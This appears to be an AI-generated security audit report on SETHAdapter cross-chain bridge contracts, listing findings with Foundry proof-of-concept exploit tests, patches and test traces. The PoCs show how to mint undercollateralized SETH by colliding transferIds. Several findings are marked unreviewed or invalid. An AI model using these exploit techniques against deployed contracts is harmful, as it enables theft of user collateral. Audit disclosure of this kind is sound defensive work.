# Audited by [V12](https://zellic.ai/)

The only autonomous Solidity auditor that finds critical bugs. Not all audits are equal, so stop paying for bad ones. Just use V12. No calls, demos, or intros.


---

# ETH/SETH legs not amount-bound by `transferId`
**#2**
- Severity: Critical
- Validity: Unreviewed

## Targets
- _credit (SETHAdapter)
- lzCompose (SETHAdapter)
- _lzReceive (SETHAdapter)

## Affected Locations
- **SETHAdapter._credit**: `_credit` only checks `ethQueue[srcEid][transferId] > 0` and deletes it, then derives `ethAmount` from message `_amountLD` and `EXCHANGE_RATE()` instead of the queued ETH amount; enforcing equality/using the queued amount here directly restores the binding between the ETH leg and the minted amount.
- **SETHAdapter.lzCompose**: `lzCompose` writes `ethQueue[srcEid][transferId] = amountLD` from compose payload data without preventing overwrites/collisions or tying the entry to an immutable expected mint amount; adding uniqueness/one-time semantics and strict pairing with the pending mint prevents a malicious ETH leg from spoofing or replacing collateral records.
- **SETHAdapter._lzReceive**: `_lzReceive` is the ingress for cross-chain mint messages and it forwards attacker-controlled `_amountLD`/`transferId` into `_credit`, making the inbound message the practical authority for how much SETH is minted unless additional validation is added.

## Description

The adapter attempts to match an ETH leg and an SETH mint leg using a `transferId`, but it never enforces that both legs agree on the same amount. In `lzCompose`, a compose payload can write `ethQueue[srcEid][transferId] = amountLD` without ensuring the `transferId` is unique or that the recorded amount corresponds to a specific pending mint, enabling overwrites/collisions. On the mint side, `_lzReceive` and `_credit` treat the message-provided `_amountLD` as authoritative and only check that `ethQueue[srcEid][transferId]` is non-zero, ignoring the queued ETH amount entirely. As a result, any non-zero queued ETH can be “paired” with an arbitrarily large (or small) SETH leg, and the adapter will forward ETH and mint SETH based on attacker-controlled message fields rather than the actually received ETH. This breaks the intended invariant that minted SETH is always backed by the corresponding ETH leg for the same `transferId`.

## Root cause

The contract accepts user-influenced `transferId`/amount data without enforcing `transferId` uniqueness and without verifying that the ETH amount stored in `ethQueue` matches the mint message’s `_amountLD` (or vice versa) before finalizing credit/mint.

## Impact

An attacker can finalize mints with less ETH than required (undercollateralized SETH) or mint against a minimal ETH leg by reusing/colliding a `transferId`, effectively consuming ETH held by the adapter for other users. Depending on the direction of the mismatch, this can also cause credits to revert due to insufficient adapter ETH, leaving legitimate cross-chain transfers stuck while collateral remains stranded in the adapter.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import { Test } from "forge-std/Test.sol";
import { SETH } from "@core/SETH.sol";
import { SETHAdapter } from "@core/SETHAdapter.sol";
import { OFTMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTMsgCodec.sol";
import { OFTComposeMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTComposeMsgCodec.sol";
import { Origin } from "@layerzerolabs/oapp-evm/contracts/oapp/OAppReceiver.sol";

contract EndpointMock {
    address public delegate;

    function setDelegate(address _delegate) external {
        delegate = _delegate;
    }
}

contract EthOFTMock {
    function sendEth(address adapter) external payable {
        (bool ok, ) = adapter.call{ value: msg.value }("");
        require(ok, "send failed");
    }
}

contract SETHAdapterTransferIdMismatchTest is Test {
    function testMismatchedTransferIdConsumesOtherCollateral() public {
        vm.deal(address(this), 50 ether);

        EndpointMock endpoint = new EndpointMock();
        EthOFTMock ethOFT = new EthOFTMock();

        uint256 nonce = vm.getNonce(address(this));
        address predictedAdapter = _computeCreateAddress(address(this), nonce + 1);

        SETH seth = new SETH(predictedAdapter);
        SETHAdapter adapter = new SETHAdapter(address(seth), address(ethOFT), address(endpoint), address(this));
        assertEq(address(adapter), predictedAdapter, "adapter address mismatch");

        uint32 srcEid = 1;
        bytes32 peer = bytes32(uint256(uint160(address(0xBEEF))));
        adapter.setPeer(srcEid, peer);

        // Legitimate collateral arrives first (10 ETH)
        ethOFT.sendEth{ value: 10 ether }(address(adapter));
        bytes memory composeLarge = _buildComposeMessage(srcEid, 10 ether, 0);
        vm.prank(address(endpoint));
        adapter.lzCompose(address(ethOFT), bytes32("ethLarge"), composeLarge, address(0), "");
        assertEq(adapter.ethQueue(srcEid, 0), 10 ether);

        // Attacker overwrites the queue entry with a tiny amount (1 ETH)
        ethOFT.sendEth{ value: 1 ether }(address(adapter));
        bytes memory composeSmall = _buildComposeMessage(srcEid, 1 ether, 0);
        vm.prank(address(endpoint));
        adapter.lzCompose(address(ethOFT), bytes32("ethSmall"), composeSmall, address(0), "");
        assertEq(adapter.ethQueue(srcEid, 0), 1 ether);
        assertEq(address(adapter).balance, 11 ether);

        // Attacker mints 10 ETH worth of SETH while only 1 ETH is queued
        address attacker = makeAddr("attacker");
        uint256 attackerAmountLD = 1000 ether; // 10 ETH worth of SETH
        uint64 attackerAmountSD = uint64(attackerAmountLD / adapter.decimalConversionRate());
        bytes memory attackerMsg = _buildOftMessage(attacker, attackerAmountSD, 0);

        Origin memory origin = Origin({ srcEid: srcEid, sender: peer, nonce: 1 });
        vm.prank(address(endpoint));
        adapter.lzReceive(origin, bytes32("seth1"), attackerMsg, address(0), "");

        assertEq(seth.balanceOf(attacker), attackerAmountLD, "attacker minted amount");
        assertEq(adapter.ethQueue(srcEid, 0), 0, "queue entry cleared");
        assertEq(address(adapter).balance, 1 ether, "collateral drained despite 1 ETH queue");
        assertEq(address(seth).balance, 10 ether, "SETH received 10 ETH collateral");
    }

    function _buildComposeMessage(uint32 srcEid, uint256 amountLD, uint256 transferId) internal view returns (bytes memory) {
        bytes memory composeMsg = abi.encodePacked(bytes32(uint256(uint160(address(this)))), abi.encode(transferId));
        return OFTComposeMsgCodec.encode(1, srcEid, amountLD, composeMsg);
    }

    function _buildOftMessage(address to, uint64 amountSD, uint256 transferId) internal view returns (bytes memory) {
        (bytes memory message, ) = OFTMsgCodec.encode(bytes32(uint256(uint160(to))), amountSD, abi.encode(transferId));
        return message;
    }

    function _computeCreateAddress(address deployer, uint256 nonce) internal pure returns (address) {
        require(nonce <= 0x7f, "nonce too large");
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce)));
        return address(uint160(uint256(hash)));
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Reject duplicate `transferId` usage and enforce that queued ETH equals the SETH-derived ETH amount by reverting on mismatches in `lzCompose`, `_processPendingMint`, and `_credit`, ensuring both legs stay amount-bound.

### Patch

```diff
diff --git a/contracts/src/core/SETHAdapter.sol b/contracts/src/core/SETHAdapter.sol
--- a/contracts/src/core/SETHAdapter.sol
+++ b/contracts/src/core/SETHAdapter.sol
@@ -298,6 +298,7 @@
             transferId := mload(add(add(rawCompose, 32), 32))
         }
 
+        if (ethQueue[srcEid][transferId] != 0) revert InvalidAmount();
         ethQueue[srcEid][transferId] = amountLD;
         _processPendingMint(srcEid, transferId);
     }
diff --git a/contracts/src/core/SETHAdapter.sol b/contracts/src/core/SETHAdapter.sol
--- a/contracts/src/core/SETHAdapter.sol
+++ b/contracts/src/core/SETHAdapter.sol
@@ -312,6 +312,9 @@
         uint256 ethAmount = ethQueue[_srcEid][_transferId];
         if (ethAmount == 0) return;
 
+        uint256 expectedEthAmount = pm.amountLD / ISETH(SETH).EXCHANGE_RATE();
+        if (ethAmount != expectedEthAmount) revert InvalidAmount();
+
         delete ethQueue[_srcEid][_transferId];
         delete pendingMints[_srcEid][_transferId];
 
diff --git a/contracts/src/core/SETHAdapter.sol b/contracts/src/core/SETHAdapter.sol
--- a/contracts/src/core/SETHAdapter.sol
+++ b/contracts/src/core/SETHAdapter.sol
@@ -363,12 +363,15 @@
         uint256 transferId = _creditTransferId;
         uint32 srcEid = _creditSrcEid;
         uint256 ethAmount = _amountLD / ISETH(SETH).EXCHANGE_RATE();
-
-        if (ethQueue[srcEid][transferId] > 0) {
+        uint256 queuedEthAmount = ethQueue[srcEid][transferId];
+
+        if (queuedEthAmount > 0) {
+            if (queuedEthAmount != ethAmount) revert InvalidAmount();
             delete ethQueue[srcEid][transferId];
             ISETH(SETH).receiveCollateral{value: ethAmount}();
             minterBurner.mint(_to, _amountLD);
         } else {
+            if (pendingMints[srcEid][transferId].to != address(0)) revert InvalidAmount();
             pendingMints[srcEid][transferId] = PendingMint({ to: _to, amountLD: _amountLD });
         }
```

### Affected Files

- `contracts/src/core/SETHAdapter.sol`

### Validation Output

```
Compiling 21 files with Solc 0.8.34
Solc 0.8.34 finished in 6.01s
Compiler run successful!

Ran 1 test for test/SETH.t.sol:SETHAdapterTransferIdMismatchTest
[FAIL: InvalidAmount()] testMismatchedTransferIdConsumesOtherCollateral() (gas: 4043818)
Traces:
  [4043818] SETHAdapterTransferIdMismatchTest::testMismatchedTransferIdConsumesOtherCollateral()
    ├─ [0] VM::deal(SETHAdapterTransferIdMismatchTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50000000000000000000 [5e19])
    │   └─ ← [Return]
    ├─ [30487] → new EndpointMock@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 152 bytes of code
    ├─ [47905] → new EthOFTMock@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 239 bytes of code
    ├─ [0] VM::getNonce(SETHAdapterTransferIdMismatchTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 3
    ├─ [1022574] → new SETH@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   └─ ← [Return] 4764 bytes of code
    ├─ [2704277] → new SETHAdapter@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
    │   ├─ [329] SETH::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: SETHAdapterTransferIdMismatchTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [22342] EndpointMock::setDelegate(SETHAdapterTransferIdMismatchTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 13264 bytes of code
    ├─ [24104] SETHAdapter::setPeer(1, 0x000000000000000000000000000000000000000000000000000000000000beef)
    │   ├─ emit PeerSet(eid: 1, peer: 0x000000000000000000000000000000000000000000000000000000000000beef)
    │   └─ ← [Stop]
    ├─ [7143] EthOFTMock::sendEth{value: 10000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 10000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [29024] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x6574684c61726765000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000008ac7230489e800000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   └─ ← [Stop]
    ├─ [1278] SETHAdapter::ethQueue(1, 0) [staticcall]
    │   └─ ← [Return] 10000000000000000000 [1e19]
    ├─ [7143] EthOFTMock::sendEth{value: 1000000000000000000}(SETHAdapter: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9])
    │   ├─ [125] SETHAdapter::receive{value: 1000000000000000000}()
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [3024] SETHAdapter::lzCompose(EthOFTMock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0x657468536d616c6c000000000000000000000000000000000000000000000000, 0x0000000000000001000000010000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   └─ ← [Stop]
    ├─ [1278] SETHAdapter::ethQueue(1, 0) [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
    │   └─ ← [Return]
    ├─ [685] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [0] VM::prank(EndpointMock: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [3585] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000beef, nonce: 1 }), 0x7365746831000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000009df0c6b0066d5317aa5b38b36850548dacca6b4e000000003b9aca000000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000000, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] SETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   └─ ← [Revert] InvalidAmount()
    └─ ← [Revert] InvalidAmount()

Backtrace:
  at SETHAdapter.lzReceive
  at SETHAdapterTransferIdMismatchTest.testMismatchedTransferIdConsumesOtherCollateral

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.98ms (1.08ms CPU time)

Ran 1 test suite in 27.26ms (1.98ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/SETH.t.sol:SETHAdapterTransferIdMismatchTest
[FAIL: InvalidAmount()] testMismatchedTransferIdConsumesOtherCollateral() (gas: 4043818)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# `send` bypasses adapter registration check
**#5**
- Severity: Critical
- Validity: Invalid

## Targets
- quoteSend (SETHAdapter)

## Affected Locations
- **SETHAdapter.quoteSend**: Single finding location

## Description

The `sethAdapters` mapping is meant to gate which destination chains are supported, and `quoteSend` enforces this by reverting when the adapter is missing. However, the actual transfer entry point `send` never reads `sethAdapters` and therefore does not enforce the same invariant. This creates an asymmetric lifecycle where the read-only quoting path validates adapter registration but the state‑changing send path does not. A caller can directly invoke `send` with a `dstEid` that has no registered adapter and still trigger the cross‑chain send. The composed SETH leg will be dispatched without a valid destination adapter, leaving the ETH leg unmatched and the burned SETH irrecoverable.

## Root cause

The invariant that `sethAdapters[dstEid]` must be non‑zero is enforced only in `quoteSend`, while `send` executes the transfer without validating the mapping.

## Impact

A user or integrator can be tricked into sending to an unregistered chain, causing permanent loss of the burned SETH and leaving ETH collateral stranded on the destination. Attackers can grief systems that call `send` based on user input by choosing unsupported `dstEid` values and forcing transfers that can never be completed.

## Remediation

**Status:** Incomplete

### Explanation

Add the same `sethAdapters[dstEid] != address(0)` validation inside `send` (or factor a shared internal check used by both `quoteSend` and `send`) so transfers revert unless the destination adapter is registered, preventing burns to unsupported chains.

---

# Compose transferId decoded at wrong offset
**#3**
- Severity: High
- Validity: Unreviewed

## Targets
- _send (SETHAdapter)

## Affected Locations
- **SETHAdapter._send**: Single finding location

## Description

The adapter encodes `transferId` into the compose payload using `abi.encode(transferId)` inside `_send`, which produces a single 32‑byte word. Both `lzCompose` and `_lzReceive` decode this payload with `mload(add(add(rawCompose, 32), 32))`, which reads the second word of the payload rather than the first. As a result, the decoded `transferId` is zero/garbage instead of the real counter value, so all in‑flight transfers from the same `srcEid` collide in `ethQueue` and `pendingMints`. When multiple transfers are in flight, each new ETH or sETH message overwrites the previous entry and `_processPendingMint`/`_credit` pair unrelated ETH amounts with unrelated mint requests. An attacker can intentionally submit a transfer so their pending mint is stored, then let a victim’s ETH message arrive first, causing the attacker to be minted while the victim’s burn is never credited.

## Root cause

`transferId` is decoded with an off‑by‑32 memory offset, so the compose payload is read from the wrong word and the real ID is lost.

## Impact

Users can lose bridged funds because their pending mint entries are overwritten and never matched to an ETH arrival. An attacker can manipulate ordering so that their mint is funded by another user’s ETH message while the victim’s mint data is discarded, resulting in loss for the victim and incorrect cross‑chain accounting.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import { Test } from "forge-std/Test.sol";
import { SETHAdapter } from "@core/SETHAdapter.sol";
import { OFTMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTMsgCodec.sol";
import { OFTComposeMsgCodec } from "@layerzerolabs/oft-evm/contracts/libs/OFTComposeMsgCodec.sol";
import { Origin } from "@layerzerolabs/oapp-evm/contracts/oapp/OAppReceiver.sol";
import { ERC20 } from "@openzeppelin-v5/contracts/token/ERC20/ERC20.sol";

contract DummyEndpoint {
    function setDelegate(address) external { }
}

contract MockSETH is ERC20 {
    uint256 public constant EXCHANGE_RATE = 100;
    address public adapter;

    error Unauthorized();

    constructor() ERC20("Mock SETH", "SETH") { }

    function setAdapter(address _adapter) external {
        require(adapter == address(0), "adapter already set");
        adapter = _adapter;
    }

    modifier onlyAdapter() {
        if (msg.sender != adapter) revert Unauthorized();
        _;
    }

    function mint(address to, uint256 amount) external onlyAdapter returns (bool) {
        _mint(to, amount);
        return true;
    }

    function burn(address from, uint256 amount) external onlyAdapter returns (bool) {
        _burn(from, amount);
        return true;
    }

    function releaseCollateral(uint256 sethAmount) external onlyAdapter {
        (bool success, ) = msg.sender.call{ value: sethAmount / EXCHANGE_RATE }("");
        require(success, "release failed");
    }

    function receiveCollateral() external payable onlyAdapter { }

    receive() external payable { }
}

contract SETHAdapterTransferIdTest is Test {
    function testTransferIdDecodedAsZeroBreaksMatching() public {
        DummyEndpoint endpoint = new DummyEndpoint();
        MockSETH seth = new MockSETH();
        address ethOft = address(0xBEEF);

        SETHAdapter adapter = new SETHAdapter(address(seth), ethOft, address(endpoint), address(this));
        seth.setAdapter(address(adapter));

        uint32 srcEid = 1;
        bytes32 peer = bytes32(uint256(uint160(address(0xCAFE))));
        adapter.setPeer(srcEid, peer);

        vm.deal(ethOft, 10 ether);
        vm.prank(ethOft);
        (bool ok, ) = address(adapter).call{ value: 3 ether }("");
        require(ok, "eth deposit failed");

        address user = address(0xA11CE);
        uint256 transferId = 1;
        uint256 sethAmount = 1000 * adapter.decimalConversionRate();

        bytes memory sethMessage = _buildSethMessage(adapter, user, sethAmount, transferId);
        Origin memory origin = Origin({ srcEid: srcEid, sender: peer, nonce: 1 });
        vm.prank(address(endpoint));
        adapter.lzReceive(origin, bytes32("guid1"), sethMessage, address(0), "");

        (address pendingTo, uint256 pendingAmount) = adapter.pendingMints(srcEid, transferId);
        assertEq(pendingTo, user);
        assertEq(pendingAmount, sethAmount);

        bytes memory ethCompose = abi.encodePacked(bytes32(uint256(uint160(address(0xDEAD)))) , abi.encode(transferId));
        bytes memory ethMessage = OFTComposeMsgCodec.encode(1, srcEid, 1 ether, ethCompose);
        vm.prank(address(endpoint));
        adapter.lzCompose(ethOft, bytes32("guid2"), ethMessage, address(0), "");

        assertEq(seth.balanceOf(user), 0);
        (pendingTo, pendingAmount) = adapter.pendingMints(srcEid, transferId);
        assertEq(pendingTo, user);
        assertEq(pendingAmount, sethAmount);

        bytes memory ethCompose2 = abi.encodePacked(bytes32(uint256(uint160(address(0xB0B)))) , abi.encode(uint256(2)));
        bytes memory ethMessage2 = OFTComposeMsgCodec.encode(2, srcEid, 2 ether, ethCompose2);
        vm.prank(address(endpoint));
        adapter.lzCompose(ethOft, bytes32("guid3"), ethMessage2, address(0), "");

        assertEq(adapter.ethQueue(srcEid, 0), 2 ether);
    }

    function _buildSethMessage(
        SETHAdapter adapter,
        address to,
        uint256 amountLD,
        uint256 transferId
    ) internal returns (bytes memory message) {
        bytes memory compose = abi.encode(transferId);
        uint64 amountSD = uint64(amountLD / adapter.decimalConversionRate());
        (message, ) = OFTMsgCodec.encode(bytes32(uint256(uint160(to))), amountSD, compose);
    }
}
```

## Remediation

**Status:** Complete

### Explanation

Decode `transferId` with `abi.decode` in `lzCompose` and `_lzReceive` so the first word of `rawCompose` is read and `(srcEid, transferId)` matching stays correct.

### Patch

```diff
diff --git a/contracts/src/core/SETHAdapter.sol b/contracts/src/core/SETHAdapter.sol
--- a/contracts/src/core/SETHAdapter.sol
+++ b/contracts/src/core/SETHAdapter.sol
@@ -293,10 +293,7 @@
         uint256 amountLD = OFTComposeMsgCodec.amountLD(_message);
         bytes memory rawCompose = OFTComposeMsgCodec.composeMsg(_message);
 
-        uint256 transferId;
-        assembly {
-            transferId := mload(add(add(rawCompose, 32), 32))
-        }
+        uint256 transferId = abi.decode(rawCompose, (uint256));
 
         ethQueue[srcEid][transferId] = amountLD;
         _processPendingMint(srcEid, transferId);
diff --git a/contracts/src/core/SETHAdapter.sol b/contracts/src/core/SETHAdapter.sol
--- a/contracts/src/core/SETHAdapter.sol
+++ b/contracts/src/core/SETHAdapter.sol
@@ -340,10 +340,7 @@
         uint256 amountReceivedLD = _toLD(OFTMsgCodec.amountSD(_message));
         bytes memory rawCompose = OFTMsgCodec.composeMsg(_message);
 
-        uint256 transferId;
-        assembly {
-            transferId := mload(add(add(rawCompose, 32), 32))
-        }
+        uint256 transferId = abi.decode(rawCompose, (uint256));
 
         _creditTransferId = transferId;
         _creditSrcEid = _origin.srcEid;
```

### Affected Files

- `contracts/src/core/SETHAdapter.sol`

### Validation Output

```
No files changed, compilation skipped

Ran 1 test for test/SETH.t.sol:SETHAdapterTransferIdTest
[FAIL: assertion failed: 0x0000000000000000000000000000000000000000 != 0x00000000000000000000000000000000000A11cE] testTransferIdDecodedAsZeroBreaksMatching() (gas: 3425874)
Traces:
  [3425874] SETHAdapterTransferIdTest::testTransferIdDecodedAsZeroBreaksMatching()
    ├─ [16075] → new DummyEndpoint@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
    │   └─ ← [Return] 80 bytes of code
    ├─ [513717] → new MockSETH@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 2341 bytes of code
    ├─ [2674227] → new SETHAdapter@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
    │   ├─ [285] MockSETH::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ emit OwnershipTransferred(previousOwner: 0x0000000000000000000000000000000000000000, newOwner: SETHAdapterTransferIdTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   ├─ [144] DummyEndpoint::setDelegate(SETHAdapterTransferIdTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop]
    │   └─ ← [Return] 13225 bytes of code
    ├─ [22705] MockSETH::setAdapter(SETHAdapter: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a])
    │   └─ ← [Stop]
    ├─ [24104] SETHAdapter::setPeer(1, 0x000000000000000000000000000000000000000000000000000000000000cafe)
    │   ├─ emit PeerSet(eid: 1, peer: 0x000000000000000000000000000000000000000000000000000000000000cafe)
    │   └─ ← [Stop]
    ├─ [0] VM::deal(0x000000000000000000000000000000000000bEEF, 10000000000000000000 [1e19])
    │   └─ ← [Return]
    ├─ [0] VM::prank(0x000000000000000000000000000000000000bEEF)
    │   └─ ← [Return]
    ├─ [125] SETHAdapter::receive{value: 3000000000000000000}()
    │   └─ ← [Stop]
    ├─ [685] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [685] SETHAdapter::decimalConversionRate() [staticcall]
    │   └─ ← [Return] 1000000000000 [1e12]
    ├─ [0] VM::prank(DummyEndpoint: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
    │   └─ ← [Return]
    ├─ [52663] SETHAdapter::lzReceive(Origin({ srcEid: 1, sender: 0x000000000000000000000000000000000000000000000000000000000000cafe, nonce: 1 }), 0x6775696431000000000000000000000000000000000000000000000000000000, 0x00000000000000000000000000000000000000000000000000000000000a11ce00000000000003e80000000000000000000000001804c8ab1f12e6bbf3894d4083f33e07309d1f380000000000000000000000000000000000000000000000000000000000000001, 0x0000000000000000000000000000000000000000, 0x)
    │   ├─ [219] MockSETH::EXCHANGE_RATE() [staticcall]
    │   │   └─ ← [Return] 100
    │   ├─ emit OFTReceived(guid: 0x6775696431000000000000000000000000000000000000000000000000000000, srcEid: 1, toAddress: 0x00000000000000000000000000000000000A11cE, amountReceivedLD: 1000000000000000 [1e15])
    │   └─ ← [Stop]
    ├─ [4712] SETHAdapter::pendingMints(1, 1) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000, 0
    ├─ [0] VM::assertEq(0x0000000000000000000000000000000000000000, 0x00000000000000000000000000000000000A11cE) [staticcall]
    │   └─ ← [Revert] assertion failed: 0x0000000000000000000000000000000000000000 != 0x00000000000000000000000000000000000A11cE
    └─ ← [Revert] assertion failed: 0x0000000000000000000000000000000000000000 != 0x00000000000000000000000000000000000A11cE

Backtrace:
  at VM.assertEq
  at SETHAdapterTransferIdTest.testTransferIdDecodedAsZeroBreaksMatching

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.20ms (629.47µs CPU time)

Ran 1 test suite in 23.19ms (1.20ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/SETH.t.sol:SETHAdapterTransferIdTest
[FAIL: assertion failed: 0x0000000000000000000000000000000000000000 != 0x00000000000000000000000000000000000A11cE] testTransferIdDecodedAsZeroBreaksMatching() (gas: 3425874)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Rounding down ETH collateral underbacks SETH
**#4**
- Severity: High
- Validity: Invalid

## Targets
- _send (SETHAdapter)

## Affected Locations
- **SETHAdapter._send**: Single finding location

## Description

The function computes the ETH leg amount as `ethAmount = amountReceivedLD / EXCHANGE_RATE` using integer division, while the SETH leg message encodes the full `amountReceivedLD`. Because no check enforces `amountReceivedLD` to be an exact multiple of `EXCHANGE_RATE`, any remainder is silently truncated from the ETH leg but still minted as SETH on the destination side. This creates a systematic mismatch between the collateral delivered by the ETH leg and the SETH amount minted by the compose message. Over repeated sends, an attacker can choose amounts that maximize the remainder to accumulate unbacked SETH. The issue is amplified if `EXCHANGE_RATE` is greater than 1 or otherwise not guaranteed to evenly divide all send amounts.

## Root cause

`ethAmount` is derived with integer division without rounding up or enforcing divisibility, while the SETH leg uses the unrounded `amountReceivedLD`.

## Impact

An attacker can mint slightly more SETH on the destination chain than the ETH collateral actually sent, leaving the system undercollateralized. By repeating sends that maximize the division remainder, the attacker can accumulate unbacked SETH and eventually redeem it for ETH, draining collateral from the system. The resulting deficit persists and weakens the peg over time.

## Remediation

**Status:** Incomplete

### Explanation

Compute the ETH collateral and SETH mint from the same rounded amount by either rounding up the ETH amount to cover all minted SETH or enforcing that `amountReceivedLD` is exactly divisible by the conversion factor and reverting otherwise; this removes the truncation gap so every SETH minted is fully backed by ETH.

---

# Collateral ratio ignores fee liabilities
**#1**
- Severity: Low
- Validity: Unreviewed

## Targets
- isFullyBacked (SETH)

## Affected Locations
- **SETH.isFullyBacked**: Single finding location

## Description

The function computes the collateral ratio using `address(this).balance` and `totalSupply()`, and reports full backing whenever the ratio meets the basis‑point threshold. The token design accrues transfer fees as an ETH‑equivalent liability while burning the corresponding SETH, so a portion of the ETH balance is reserved for fees rather than backing SETH holders. Because the fee liability is not subtracted, the function treats reserved fees as backing collateral. Each fee event reduces supply while leaving the balance unchanged, which inflates the reported ratio. As a result, the view can signal full backing even when the ETH available for redemption is below outstanding SETH.

## Root cause

The collateral ratio is calculated from the raw ETH balance without accounting for accrued fee obligations that are excluded from backing.

## Impact

Users and integrations can be misled into believing SETH is fully collateralized while a portion of the ETH balance is earmarked for fees. If any on‑chain or off‑chain logic relies on this signal to authorize ETH releases or assess solvency, decisions may be made based on overstated backing, allowing undercollateralization to persist undetected.